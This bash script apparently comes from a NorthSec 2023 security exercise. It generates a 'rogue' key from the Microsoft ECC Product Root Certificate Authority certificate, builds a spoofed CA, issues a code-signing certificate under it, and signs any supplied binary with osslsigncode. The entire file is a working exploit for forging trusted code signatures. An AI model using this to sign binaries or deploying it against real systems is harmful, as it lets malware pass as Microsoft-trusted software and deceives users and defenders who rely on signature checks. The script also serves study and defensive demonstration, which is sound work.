#!/bin/bash

#Path
CERT="MicrosoftECCProductRootCertificateAuthority.cer"
OPENSSL=~/software/openssl_1_1_1e/apps/openssl
OSSLSIGNCODE=~/software/osslsigncode/build/osslsigncode

#File
if [ ! -f "$1" ]; then
    echo "Usage: $0 <file>."
    exit 2
fi

#File name
filename=$(basename -- "$1")
extension="${filename##*.}"
filename="${filename%%.*}"

#Remove previous result
signed="$filename"_signed."$extension"
if [ -f "$signed" ]; then
    rm $signed
fi

echo "Generating rogue key..."
./genkey.py $CERT

echo "Generating CA certificate..."
$OPENSSL req -key rogue.key -new -out rogue.crt -x509 -config ca.conf -days 1460

echo "Generating client private key..."
openssl ecparam -name prime256v1 -genkey -noout -out cert.key

echo "Generating client certificate request..."
$OPENSSL req -key cert.key -config cert_cs.conf -new -out cert.csr

$OPENSSL x509 -req -in cert.csr -CA rogue.crt -CAkey rogue.key -CAcreateserial -out cert.crt -days 1000 -extensions v3_req -extfile cert_cs.conf

echo "Verifying client certificate..."
$OPENSSL verify -verbose -CAfile rogue.crt cert.crt

echo "Generating PKCS12..."
$OPENSSL pkcs12 -export -in cert.crt -inkey cert.key -certfile rogue.crt -name "Code Signing" -out cert.p12 -password pass:

echo "Signing binary.."
$OSSLSIGNCODE sign -pkcs12 cert.p12 -n "Signed by NorthSec 2023" -in $1 -out $signed